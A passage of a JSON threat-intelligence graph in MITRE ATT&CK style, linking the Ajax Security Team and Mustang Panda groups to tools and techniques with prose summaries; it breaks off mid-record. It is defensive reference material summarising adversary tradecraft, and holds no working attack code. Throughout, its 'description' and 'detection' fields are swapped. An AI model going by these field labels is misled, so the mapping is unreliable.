{
    "nodes": [
        {
            "id": "G0130",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Ajax Security Team",
                "aliases": [
                    "Operation Woolen-Goldfish",
                    "AjaxTM",
                    "Rocket Kitten",
                    "Flying Kitten",
                    "Operation Saffron Rose"
                ],
                "description": "Ajax Security Team is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 Ajax Security Team transitioned from website defacement operations to malware-based cyber espionage campaigns targeting the US defense industrial base and Iranian users of anti-censorship technologies.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0225": "sqlmap",
                    "S0224": "Havij"
                },
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1566.003": "Spearphishing via Service",
                    "T1566.001": "Spearphishing Attachment",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1105": "Ingress Tool Transfer"
                }
            }
        },
        {
            "id": "T1190",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploit Public-Facing Application",
                "chain_phase": "initial-access",
                "description": "Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.",
                "detection": "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services. Depending on the flaw being exploited this may include Exploitation for Defense Evasion. \n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Network",
                    "Linux",
                    "macOS",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0225",
            "type": "tool",
            "attributes": {
                "name": "sqlmap",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "sqlmap is an open source penetration testing tool that can be used to automate the process of detecting and exploiting SQL injection flaws.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1190": "Exploit Public-Facing Application"
                }
            },
            "val": 1
        },
        {
            "id": "S0224",
            "type": "tool",
            "attributes": {
                "name": "Havij",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Havij is an automatic SQL Injection tool distributed by the Iranian ITSecTeam security company. Havij has been used by penetration testers and adversaries.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1190": "Exploit Public-Facing Application"
                }
            },
            "val": 1
        },
        {
            "id": "G0129",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Mustang Panda",
                "aliases": [
                    "TA416",
                    "RedDelta",
                    "BRONZE PRESIDENT"
                ],
                "description": "Mustang Panda is a China-based cyber espionage threat actor that was first observed in 2017 but may have been conducting operations since at least 2014. Mustang Panda has targeted government entities, nonprofits, religious, and other non-governmental organizations in the U.S., Germany, Mongolia, Myanmar, Pakistan, and Vietnam, among others.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0590": "NBTscan",
                    "S0154": "Cobalt Strike",
                    "S0013": "PlugX",
                    "S0012": "PoisonIvy"
                },
                "techniques": {
                    "T1583.001": "Domains",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1574.002": "DLL Side-Loading",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1052.001": "Exfiltration over USB",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1564.001": "Hidden Files and Directories",
                    "T1560.003": "Archive via Custom Method",
                    "T1560.001": "Archive via Utility",
                    "T1003.003": "NTDS",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.001": "Binary Padding",
                    "T1070.004": "File Deletion",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1218.004": "InstallUtil",
                    "T1053.005": "Scheduled Task",
                    "T1518": "Software Discovery",
                    "T1219": "Remote Access Software",
                    "T1203": "Exploitation for Client Execution",
                    "T1119": "Automated Collection",
                    "T1105": "Ingress Tool Transfer",
                    "T1091": "Replication Through Removable Media",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1036": "Masquerading",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "T1046",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Service Scanning",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.",
                "detection": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1040",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Sniffing",
                "chain_phase": "credential-access",
                "description": "Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Man-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.",
                "detection": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "T1033",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Owner/User Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1018",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote System Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net. Adversaries may also use local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems. \n\nSpecific to macOS, the <code>bonjour</code> protocol exists to discover additional Mac-based systems within the same broadcast domain.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1016",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Network Configuration Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0590",
            "type": "tool",
            "attributes": {
                "name": "NBTscan",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "NBTscan is an open source tool that has been used by state groups to conduct internal reconnaissance within a compromised network.",
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "techniques": {
                    "T1046": "Network Service Scanning",
                    "T1040": "Network Sniffing",
                    "T1033": "System Owner/User Discovery",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 5
        },
        {
            "id": "T1059.007",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "JavaScript",
                "chain_phase": "execution",
                "description": "Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nMonitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
                "detection": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1027.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Indicator Removal from Tools",
                "chain_phase": "defense-evasion",
                "description": "The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.",
                "detection": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1573.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Asymmetric Cryptography",
                "chain_phase": "command-and-control",
                "description": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1573.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Symmetric Cryptography",
                "chain_phase": "command-and-control",
                "description": "With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1071.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "DNS",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for DNS traffic to/from known-bad or suspicious domains.",
                "detection": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1071.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Web Protocols",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from known-bad or suspicious domains. ",
                "detection": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1572",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Protocol Tunneling",
                "chain_phase": "command-and-control",
                "description": "Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. \n\nProtocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. \n\nAdversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1090.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Internal Proxy",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1078.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Accounts",
                "chain_phase": "defense-evasion",
                "description": "Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.",
                "detection": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1078.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Accounts",
                "chain_phase": "defense-evasion",
                "description": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.",
                "detection": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.  Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1569.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Service Execution",
                "chain_phase": "execution",
                "description": "Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).",
                "detection": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and Net.\n\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Python",
                "chain_phase": "execution",
                "description": "Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "detection": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1059.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Visual Basic",
                "chain_phase": "execution",
                "description": "Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.",
                "detection": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1059.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Command Shell",
                "chain_phase": "execution",
                "description": "Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "detection": "Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "PowerShell",
                "chain_phase": "execution",
                "description": "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.",
